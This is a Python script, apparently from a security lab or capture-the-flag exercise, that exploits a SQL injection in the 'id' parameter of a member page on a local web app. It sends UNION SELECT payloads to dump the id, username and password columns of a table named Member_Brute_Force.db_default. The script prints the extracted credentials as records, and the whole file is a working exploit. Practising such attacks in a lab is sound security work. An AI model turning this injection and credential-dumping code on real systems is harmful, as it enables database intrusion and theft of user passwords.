from requests import get
import re

def dump_column(col: str):
    id = f"0 UNION SELECT {col}, null FROM Member_Brute_Force.db_default"
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    txt = response.text
    c = re.findall(r"First name:\s*([^\n<]+)", txt)
    return c

def dump_2_columns(col1: str, col2: str):
    id = f"0 UNION SELECT {col1}, {col2} FROM Member_Brute_Force.db_default"
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    txt = response.text
    c1 = []
    c2 = []
    if col1:
        c1 = re.findall(r"First name:\s*([^\n<]+)", txt)
    if col2:
        c2 = re.findall(r"Surname :\s*([^\n<]+)", txt)
    return [c1, c2]

def main():
    # id
    res = dump_column("id")
    ids = res

    # username, password
    res = dump_2_columns("username", "password")
    usernames = res[0]
    passwords = res[1]

    db = []

    for i in range(len(ids)):
        db.append({
            "id": ids[i],
            "username": usernames[i],
            "password": passwords[i]
        })

    for entry in db:
        print("{")
        for key in entry:
            print(f"\t{key}: {entry[key]}")
        print("}")

if __name__ == "__main__":
	main()